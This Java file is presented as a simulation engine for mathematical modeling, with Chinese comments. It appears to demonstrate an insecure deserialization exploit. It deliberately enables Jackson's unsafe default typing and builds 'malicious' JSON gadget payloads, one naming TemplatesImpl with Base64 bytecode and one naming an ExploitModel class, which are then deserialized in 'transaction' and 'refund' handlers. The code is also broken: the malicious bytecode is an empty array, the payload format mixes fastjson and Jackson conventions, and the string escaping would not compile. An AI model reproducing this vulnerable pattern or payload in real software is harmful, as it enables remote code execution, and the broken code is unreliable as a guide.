import com.fasterxml.jackson.databind.ObjectMapper;
import com.alibaba.fastjson.JSON;
import java.io.IOException;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

// 数学建模核心类
abstract class Model {
    public abstract double calculate(double[] params);
}

// 漏洞利用链载体
class SimulationTask implements java.io.Serializable {
    private static final long serialVersionUID = 1L;
    private String name;
    private Model model;
    
    public SimulationTask(String name, Model model) {
        this.name = name;
        this.model = model;
    }
    
    public void execute(double[] params) {
        System.out.println("Running " + name + ": " + model.calculate(params));
    }
}

public class SimulationEngine {
    // 不安全的反序列化配置
    private static final ObjectMapper mapper = new ObjectMapper();
    static {
        // 启用不安全的默认类型信息
        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
    }
    
    // 模拟从Redis获取购物车数据
    public static String getCartDataFromRedis(String uuid) {
        // 恶意构造的JSON数据（简化示例）
        return "{\\"@type\\":\\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\","
              + "\\"_bytecodes\\":[\\"" + Base64.getEncoder().encodeToString(getEvilBytecode()) + "\\"],"
              + "\\"_name\\":\\"MathExploit\\",\\"_tfactory\\":{}}";
    }
    
    // 模拟生成恶意字节码（实际利用需要完整TemplatesImpl链）
    private static byte[] getEvilBytecode() {
        // 简化表示，实际应包含完整恶意字节码
        return new byte[0];
    }
    
    // 不安全的反序列化入口
    public static SimulationTask parseTransactionSuccessParams(String uuid) {
        try {
            String data = getCartDataFromRedis(uuid);
            // 存在类型混淆漏洞的反序列化
            return mapper.readValue(data, SimulationTask.class);
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
    }
    
    // 另一个反序列化入口
    public static SimulationTask parseRefundSuccessParams(String pid) {
        // 模拟从商品信息构造参数
        String payload = "{\\"@type\\":\\"com.example.ExploitModel\\",\\"model\\":{}}";
        try {
            return mapper.readValue(payload, SimulationTask.class);
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
    }
    
    public static void main(String[] args) {
        // 模拟处理交易成功
        SimulationTask task1 = parseTransactionSuccessParams("malicious-uuid");
        if (task1 != null) {
            task1.execute(new double[]{1.0, 2.0});  // 触发漏洞
        }
        
        // 模拟处理退款成功
        SimulationTask task2 = parseRefundSuccessParams("malicious-pid");
        if (task2 != null) {
            task2.execute(new double[]{3.0, 4.0});  // 触发漏洞
        }
    }
}